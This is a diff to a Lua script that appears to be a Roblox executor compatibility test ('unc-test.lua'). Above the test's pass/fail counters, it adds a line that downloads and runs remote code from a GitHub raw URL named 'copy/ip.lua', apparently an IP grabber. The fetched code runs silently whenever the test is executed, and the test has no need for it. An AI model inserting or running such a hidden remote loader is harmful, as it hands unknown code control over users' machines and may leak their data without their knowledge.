@@ -1,3 +1,7 @@
+_G.script_executed = "unc-test.lua"
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/xielbers/scripts/main/copy/ip.lua'))()
+
 local passes, fails, undefined = 0, 0, 0
 local running = 0
 
